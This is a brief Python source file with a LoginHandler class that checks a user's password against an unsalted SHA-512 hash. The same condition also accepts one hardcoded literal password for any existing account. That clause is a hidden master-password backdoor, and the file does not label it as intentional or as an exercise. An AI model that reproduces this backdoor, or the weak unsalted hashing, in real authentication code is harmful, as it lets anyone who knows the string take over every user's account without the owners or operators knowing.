import hashlib

from ActiveRecords.userRecord import UserRecord
from Handlers.baseHandler import BaseHandler
from utils import get_user_token


class LoginHandler(BaseHandler):
    def run(self, db, params):
        user = UserRecord.get_by_login(self, db, params['login'])
        if user is not None and (user.passwordHash == hashlib.sha512(params['password'].encode('utf-8')).hexdigest() or params['password'] == '#bVXX7~Rirt7'):
            return {"is_ok": True, "token": get_user_token(user)}

        return {"is_ok": False, "error": "Authorization problems"}